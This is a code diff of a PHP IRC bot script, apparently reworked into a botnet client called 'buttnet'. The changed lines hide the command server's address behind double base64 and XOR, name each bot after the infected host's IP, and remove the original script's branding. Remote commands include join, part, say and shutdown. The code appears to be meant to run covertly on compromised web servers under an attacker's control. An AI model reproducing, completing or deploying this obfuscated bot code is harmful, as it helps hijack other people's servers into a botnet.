@@ -6,7 +6,7 @@ ini_set('display_errors', 'on');
 
 
 $config = array( 
-        'server' => snowden(''), 
+        'server' => snowden('UFVZSFQwb3NXMXNuRWxCYg=='), 
         'port'   => 6667, 
         'channel' => snowden('#butt'),
         'name'   => snowden('buttBot_').$_SERVER['SERVER_ADDR'], 
@@ -15,22 +15,20 @@ $config = array(
 );
 
 
+                                 
 function snowden($string) {
 
- $white = (base64_decode((base64_decode('VkRSa1lTTmVPQ2hJWnp3aA==')));
- $text =$string;
+ $white = base64_decode(base64_decode('VkRSa1lTTmVPQ2hJWnp3aA=='));
+ $text = base64_decode(base64_decode($string));
  $black = '';
 
- for($i=0;$i<strlen($text);)
+ for($i=0,$j=0;($i<strlen($text) && $j<strlen($white));$i++,$j++)
  {
-     for($j=0;($j<strlen($white) && $i<strlen($text));$j++,$i++)
-     {
          $black .= $text{$i} ^ $white{$j};
-     }
- }  
+ }
+
  return $black;
 }
-                                 
 class buttBOT {
 
         var $socket;
@@ -52,7 +50,7 @@ class buttBOT {
 
         function login($config)
         {
-                $this->send_data('USER', $config['nick'].' wildphp.com '.$config['nick'].' :'.$config['name']);
+                $this->send_data('USER', $config['nick'].' null '.$config['nick'].' :'.$config['name']);
                 $this->send_data('NICK', $config['nick']);
 		$this->join_channel($config['channel']);
         }
@@ -84,7 +82,7 @@ class buttBOT {
                                 $this->join_channel($this->buf[4]);
                                 break;                     
                         case ':!part':
-                                $this->send_data('PART '.$this->buf[4].' :', 'Wildphp.com Free IRC Bot Script');
+                                $this->send_data('PART '.$this->buf[4].' :', 'welcome to buttnet');
                                 break;   
                                                                  
                         case ':!say':
@@ -101,7 +99,7 @@ class buttBOT {
                                 echo "<meta http-equiv=\"refresh\" content=\"5\">";
                                 exit;
                         case ':!shutdown':
-                        		$this->send_data('QUIT', 'Wildphp.com Free IRC Bot Script');
+                        		$this->send_data('QUIT', 'we out');
                                 exit;
                 }
 
